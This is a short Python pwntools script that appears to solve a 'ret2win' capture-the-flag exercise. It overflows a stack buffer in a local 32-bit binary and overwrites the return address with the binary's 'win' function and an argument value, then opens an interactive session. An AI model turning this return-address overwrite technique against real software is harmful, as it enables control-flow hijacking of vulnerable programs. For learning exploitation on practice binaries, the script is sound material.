#!/usr/bin/env python3

from pwn import *

TARGET = './ret2win_32'

context.arch = 'i386'

elf = ELF(TARGET)
p = process(TARGET)

win = elf.symbols['win']
pad = p32(0x0)
payload = b'A' * 40 + b'B' * 4 + p32(win) + pad + p32(0xbaadc0de)
pause()
p.sendlineafter(b'Input: ', payload)

p.interactive()

